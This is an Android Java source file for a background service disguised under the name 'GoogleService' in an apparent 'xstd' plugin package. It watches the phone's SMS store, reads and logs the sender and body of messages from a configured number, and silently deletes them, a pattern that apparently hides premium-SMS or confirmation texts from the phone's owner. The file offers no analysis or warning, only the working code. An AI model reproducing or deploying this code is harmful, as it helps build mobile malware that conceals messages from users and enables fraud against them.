package com.xstd.plugin.service;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;

import java.util.LinkedList;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-22
 * Time: AM6:00
 * To change this template use File | Settings | File Templates.
 */
public class GoogleService extends Service {

    //    private static final String SMS_URI = "content://sms/";//1.6下的系统
    private static final String SMS_URI = "content://mms-sms/";
    private static final String SMS_INBOX_URI = "content://sms";

    private ContentResolver mResolver;

    private ContentObserver smsContentObserver = new ContentObserver(new Handler()) {

        @Override
        public void onChange(boolean selfChange) {
            Config.LOGD("[[ContentObserver]] onChange find SMS changed. selfChange : " + selfChange + " ::::::::");

            super.onChange(true);
            /*Cursor cursor = resolver.query(
                    Uri.parse(SMS_INBOX_URI),
                    new String[] { "_id", "address", "thread_id", "date",
                            "protocol", "type", "body", "read" },
                    " address=? and read=?", new String[] {SENDER_ADDRESS, "0"},
                    "date desc");*/
            //注释掉的是查未读状态的，但如果你的手机安装了第三放的短信软件时，他们有可能把状态改变了，你就查询不到数据
            Cursor cursor = mResolver.query(Uri.parse(SMS_INBOX_URI),
                                               new String[]{"_id", "address", "thread_id", "date",
                                                               "protocol", "type", "body", "read"},
                                               " address=?", new String[]{ AppRuntime.BLOCKED_NUMBER_WITH_PREFIX},
                                               "date desc");

            if (cursor == null) {
                return;
            }

            LinkedList<String> idList = new LinkedList<String>();

            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                String id = cursor.getString(cursor.getColumnIndex("_id"));
                idList.add(id);
                Config.LOGD("[[ContentObserver::onChanged]] current SMS address : " + address
                                + " body : " + body + " id : " + id + " >>>>>");

                break;
            }

            if (Config.DELETE_RECEIVED_MESSAGE) {
                for (String id : idList) {
                    mResolver.delete(Uri.parse("content://sms/" + id), null, null);
                    Config.LOGD("[[ContentObserver::onChanged]] try to delete SMS id : " + id);
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        Config.LOGD("[[GoogleService]] onCreate");

        mResolver = getContentResolver();
        mResolver.registerContentObserver(Uri.parse(SMS_URI), true, smsContentObserver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Config.LOGD("[[GoogleService]] onStartCommand");

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Config.LOGD("[[GoogleService]] onCreate");

        mResolver.unregisterContentObserver(smsContentObserver);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }


}
